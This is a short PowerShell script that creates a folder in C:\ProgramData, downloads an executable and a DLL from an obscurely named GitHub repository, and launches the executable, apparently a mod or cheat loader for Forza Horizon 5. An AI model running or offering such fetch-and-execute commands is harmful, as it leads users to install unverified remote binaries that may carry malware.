mkdir "C:\ProgramData\STANDFH5"
 
 $source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Stand%20for%20FH5.exe"

$destination = "C:\ProgramData\STANDFH5\Stand fo FH5.exe"

Invoke-WebRequest -Uri $source -OutFile $destination

$source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Backend.dll"

$destination = "C:\ProgramData\STANDFH5\backend.dll"

Invoke-WebRequest -Uri $source -OutFile $destination

start "C:\ProgramData\STANDFH5\Stand fo FH5.exe"

